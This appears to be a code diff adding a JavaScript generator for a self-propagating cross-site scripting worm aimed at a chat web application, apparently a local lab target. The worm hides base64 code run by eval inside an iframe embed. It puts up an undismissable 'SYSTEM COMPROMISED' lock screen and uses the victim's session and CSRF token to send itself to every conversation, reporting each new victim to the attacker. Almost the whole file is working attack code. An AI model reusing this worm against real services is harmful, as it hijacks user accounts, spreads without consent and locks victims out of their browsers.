@@ -1,0 +1,235 @@
+console.log((function(){
+    function utf8ToB64(str) {
+        return btoa(unescape(encodeURIComponent(str)));
+    }
+
+    const attackerId = localStorage.getItem('userId');
+    const attackerUsername = localStorage.getItem('username');
+    const wormLogic = `(async()=>{
+    if(localStorage.getItem('BOSS')==='true') return;
+    if(window.WORM_ACTIVE) return;
+    window.WORM_ACTIVE = 1;
+    await new Promise(r => setTimeout(r, 2000));
+    var attackerId = "${attackerId || ''}";
+    var attackerUsername = "${attackerUsername || 'unknown'}";
+    var baseUrl = 'http://localhost:3001';
+
+    var memoryPayload = "";
+    var attempts = 0;
+    
+    while(!memoryPayload && attempts < 20) {
+        var el = document.querySelector(".rich-media-embed");
+        memoryPayload = el ? el.outerHTML : ""; 
+        if(!memoryPayload) await new Promise(r=>setTimeout(r, 100));
+        attempts++;
+    }
+
+    if(!memoryPayload) {
+        console.log('No payload found');
+        return;
+    } 
+
+    console.log('Worm activated!');
+    var d = document;    
+    function createLockScreen() {
+        var existingLock = d.getElementById('worm-lockscreen');
+        if(existingLock) return existingLock;
+        
+        var con = d.createElement('div');
+        con.id = 'worm-lockscreen';
+        con.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:black;z-index:2147483647;overflow:hidden;cursor:none;font-family:monospace';
+        d.body.appendChild(con);
+        
+        var c = d.createElement('canvas');
+        var ctx = c.getContext('2d');
+        c.width = window.innerWidth;
+        c.height = window.innerHeight;
+        con.appendChild(c);
+        
+        var msg = d.createElement('div');
+        msg.id = 'worm-message';
+        msg.style.cssText = 'position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#0f0;text-align:center;background:rgba(0,0,0,0.8);padding:20px;border:1px solid #0f0;box-shadow:0 0 20px #0f0;font-size:24px;z-index:2147483648';
+        msg.innerHTML = 'SYSTEM COMPROMISED<br><span style="font-size:14px;color:#aaa">PERSISTENCE ACHIEVED...</span>';
+        con.appendChild(msg);
+        
+        var chars = '01'.split('');
+        var fs = 14;
+        var cols = c.width/fs;
+        var drops = [];
+        for(var x=0;x<cols;x++) drops[x]=1;
+        
+        function matrixAnimation() {
+            if(!c.parentNode) return;
+            ctx.fillStyle = 'rgba(0,0,0,0.05)';
+            ctx.fillRect(0,0,c.width,c.height);
+            ctx.fillStyle = '#0F0';
+            ctx.font = fs+'px monospace';
+            for(var i=0;i<drops.length;i++){
+                var txt = chars[Math.floor(Math.random()*chars.length)];
+                ctx.fillText(txt,i*fs,drops[i]*fs);
+                if(drops[i]*fs>c.height && Math.random()>0.975) drops[i]=0;
+                drops[i]++;
+            }
+            requestAnimationFrame(matrixAnimation);
+        }
+        requestAnimationFrame(matrixAnimation);
+        
+        return con;
+    }
+    
+    function ensureLockScreen() {
+        var lockScreen = d.getElementById('worm-lockscreen');
+        if(!lockScreen) createLockScreen();
+    }
+    
+    var lockScreen = createLockScreen();
+    var msg = d.getElementById('worm-message');
+    
+    var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            mutation.removedNodes.forEach(function(node) {
+                if(node.id === 'worm-lockscreen' || node.querySelector && node.querySelector('#worm-lockscreen')) {
+                    setTimeout(ensureLockScreen, 10);
+                }
+            });
+        });
+    });
+    observer.observe(d.body, { childList: true, subtree: true });
+    
+    var safetyInterval = setInterval(ensureLockScreen, 1000);
+
+    try {
+        var f = window.fetch;
+        var tokenRes = await f(baseUrl + '/api/csrf-token', { credentials: 'include' });
+        if (!tokenRes.ok) return;
+        var tokenData = await tokenRes.json();
+        var csrfToken = tokenData.csrfToken;        
+        async function sendWithRetry(url, options, maxRetries = 3) {
+            for (let retry = 0; retry < maxRetries; retry++) {
+                const response = await f(url, options);
+                if (response.status === 429) {
+                    console.log('Rate limited, waiting 2 seconds...');
+                    await new Promise(r => setTimeout(r, 2000));
+                    continue;
+                }
+                return response;
+            }
+            throw new Error('Max retries exceeded for ' + url);
+        }
+
+        var r2 = await sendWithRetry(baseUrl + '/api/my-conversations', {
+            method: 'GET',
+            credentials: 'include',
+            headers: { 'X-CSRF-Token': csrfToken }
+        });
+        if(!r2.ok) return;
+        var chats = await r2.json();
+        console.log('Found chats:', chats.length);
+        
+        if(chats.length === 0) return;
+        var attackerChatId = null;
+        var myId = localStorage.getItem('userId');
+        
+        if (attackerId && attackerId !== myId) {
+            for(var j=0; j<chats.length; j++) {
+                var participants = chats[j].participants || [];
+                if(participants.some(p => p._id === attackerId)) {
+                    attackerChatId = chats[j]._id;
+                    break;
+                }
+            }
+            if(!attackerChatId) {
+                try {
+                    var convRes = await sendWithRetry(baseUrl + '/conversations/private', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
+                        credentials: 'include',
+                        body: JSON.stringify({ myId: myId, friendId: attackerId })
+                    });
+                    if(convRes.ok) {
+                        var conv = await convRes.json();
+                        attackerChatId = conv._id;
+                    }
+                } catch(e) {}
+            }
+        }
+
+        var encodedWorm = '';
+        var cleanPayload = memoryPayload.replace(/data-executed="[^"]*"/g, '');
+        var contentMatch = cleanPayload.match(/window\\.eval\\(window\\.atob\\("([^"]+)"\\)\\)/);
+        if(contentMatch && contentMatch[1]) {
+            encodedWorm = contentMatch[1];
+        } else {
+            var base64Match = memoryPayload.match(/atob\\("([A-Za-z0-9+/=]+)"\\)/);
+            if(base64Match && base64Match[1]) {
+                encodedWorm = base64Match[1];
+            } else {
+                var genericMatch = memoryPayload.match(/"([A-Za-z0-9+/=]{50,})"/);
+                if(genericMatch && genericMatch[1]) {
+                    encodedWorm = genericMatch[1];
+                } else return;
+            }
+        }
+        
+        console.log('Extracted worm code length:', encodedWorm.length);
+
+        for(var i=0; i<chats.length; i++){
+            if(msg) msg.innerHTML = 'Infecting: ' + chats[i].username + '<br><span style="font-size:12px">Bypassing Security...</span>';
+            
+            await new Promise(r => setTimeout(r, 1200));
+            var infectionPayload = '<iframe class="rich-media-embed" src="https://www.youtube.com/embed/dQw4w9WgXcQ">' +
+                                  'window.eval(window.atob("' + encodedWorm + '"))' +
+                                  '</iframe>';
+            
+            var sendResponse = await sendWithRetry(baseUrl + '/api/messages', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
+                credentials: 'include',
+                body: JSON.stringify({ conversationId: chats[i]._id, text: infectionPayload })
+            });
+            
+            if(sendResponse.ok) {
+                console.log('Successfully infected:', chats[i].username);
+                
+                if(attackerChatId && attackerId !== myId) {
+                    await new Promise(r => setTimeout(r, 1200));
+                    try {
+                        var reportMsg = '[WORM REPORT] New victim infected: ' + chats[i].username + ' (ID: ' + chats[i]._id + ') at ' + new Date().toLocaleString();
+                        var reportResponse = await sendWithRetry(baseUrl + '/api/messages', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
+                            credentials: 'include',
+                            body: JSON.stringify({ conversationId: attackerChatId, text: reportMsg })
+                        });
+                        if(reportResponse.ok) {
+                            console.log('Report sent to attacker');
+                        }
+                    } catch(reportErr) {
+                        console.log('Failed to send report:', reportErr);
+                    }
+                }
+            } else {
+                var errorText = await sendResponse.text();
+                console.log('Failed to infect:', chats[i].username, errorText);
+                if (errorText.includes('CSRF')) {
+                    var newTokenRes = await sendWithRetry(baseUrl + '/api/csrf-token', { credentials: 'include' });
+                    if (newTokenRes.ok) {
+                        var newTokenData = await newTokenRes.json();
+                        csrfToken = newTokenData.csrfToken;
+                        i--; 
+                    }
+                }
+            }
+        }
+        
+        if(msg) msg.innerHTML = '<h1 style="color:red">SYSTEM LOCKED</h1><br>' +
+                               '<span style="font-size:14px">Worm propagated successfully</span>';
+        
+    } catch(e) {
+        console.error('Worm Error:', e);
+        if(msg) msg.innerHTML = 'ERROR: ' + e.message;
+    }
+})()`;
+
+    return `<iframe class="rich-media-embed" src="https://www.youtube.com/embed/dQw4w9WgXcQ">window.eval(window.atob("${utf8ToB64(wormLogic)}"))</iframe>`;
+})());
